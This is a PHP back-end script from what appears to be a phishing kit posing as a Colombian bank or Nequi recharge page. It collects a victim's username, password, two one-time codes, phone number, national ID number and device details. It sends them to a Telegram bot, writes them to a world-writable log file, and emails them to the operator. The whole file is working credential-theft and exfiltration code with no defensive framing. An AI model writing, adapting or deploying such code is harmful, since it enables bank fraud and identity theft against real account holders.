<?php
require('../config.php');
require_once("../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s"); 
$dominio = $_SERVER['SERVER_NAME'];  

$otp2 = $ifilter->process($_POST['otp2']);

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$otp = $_COOKIE['otp'];

$celular = $_COOKIE['celular'];
$cedula = $_COOKIE['cedula'];
$persona = $_COOKIE['persona'];
$banco = $_COOKIE['banco'];
$dispositivo = $_COOKIE['dispositivo'];
$nombrebanco = $_COOKIE['nombrebanco'];

$ipcliente = $_SERVER['REMOTE_ADDR'];


function getSslPage($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$data = [
	'chat_id' => $id_chat,
	'parse_mode' => 'HTML',
	'text' => '<b>'.$dominio.'</b>
	Datos Paso 4 <b>OTP (Recarga Nequi)</b> '.$hoy2.'

	<b>Usuario:</b> '.$usuario.'
	<b>Password:</b> '.$contrasena.'
	<b>OTP1:</b> '.$otp.'
	<b>OTP2:</b> '.$otp2.'
	<b>Celular:</b> '.$celular.'
	<b>cedula:</b> '.$cedula.'
	<b>Tipo de Persona:</b> '.$persona.'
	<b>Banco:</b> '.$nombrebanco.'
	<b>Dispositivo:</b> '.$dispositivo.'
	<b>IP:</b> '.$ipcliente.'
	'
];

$response = getSslPage("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));

$datos = 'Usuario: '.$usuario.' | Password: '.$contrasena.' | OTP1: '.$otp.' | OTP2: '.$otp2.' | Celular: '.$celular.' | cedula: '.$cedula.' | Tipo de Persona: '.$persona.' | Banco: '.$nombrebanco.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

$file = '../5-otp-error.txt';

$salto = "";
$cabecera = "---------------- Paso 5 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;


$to = $destino;
$subject = "Datos Recarga Nequi Paso 5 ".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Celular: ".$dominio."</b><br>
<b>Usuario: </b>".$usuario."<br> 
<b>Password: </b>".$contrasena."<br>
<b>OTP1: </b>".$otp."<br>
<b>OTP2: </b>".$otp2."<br>
<b>Celular: </b>".$celular."<br> 
<b>cedula: </b>".$cedula."<br>
<b>Tipo de Persona: </b>".$persona."<br> 
<b>Banco: </b>".$nombrebanco."<br>
<b>Dispositivo: </b>".$dispositivo."<br> 
<b>Dirección IP: </b>".$ipcliente."<br> 
<b>Hora/Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>